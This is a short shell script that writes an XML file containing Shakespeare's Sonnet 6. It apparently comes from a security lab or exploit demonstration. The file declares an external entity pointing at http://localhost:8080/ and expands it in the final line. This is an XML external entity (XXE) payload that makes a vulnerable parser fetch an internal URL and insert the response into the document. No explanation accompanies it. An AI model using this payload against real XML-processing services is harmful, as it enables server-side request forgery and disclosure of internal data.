#!/bin/sh
cat <<END > app/sonets/6.xml
<!DOCTYPE external [
    <!ENTITY cow SYSTEM "http://localhost:8080/">
]>
<poem>
<line> Then let not winter's ragged hand deface </line>
<line> In thee thy summer, ere thou be distill'd: </line>
<line> Make sweet some vial; treasure thou some place </line>
<line> With beauty's treasure, ere it be self-kill'd. </line>
<line> That use is not forbidden usury, </line>
<line> Which happies those that pay the willing loan; </line>
<line> That's for thyself to breed another thee, </line>
<line> Or ten times happier, be it ten for one; </line>
<line> Ten times thyself were happier than thou art, </line>
<line> If ten of thine ten times refigured thee: </line>
<line> Then what could death do, if thou shouldst depart, </line>
<line> Leaving thee living in posterity? </line>
<line> Be not self-will'd, for thou art much too fair </line>
<line> To be death's conquest and make worms thine heir. </line>
<line>&cow;</line>
</poem>
END
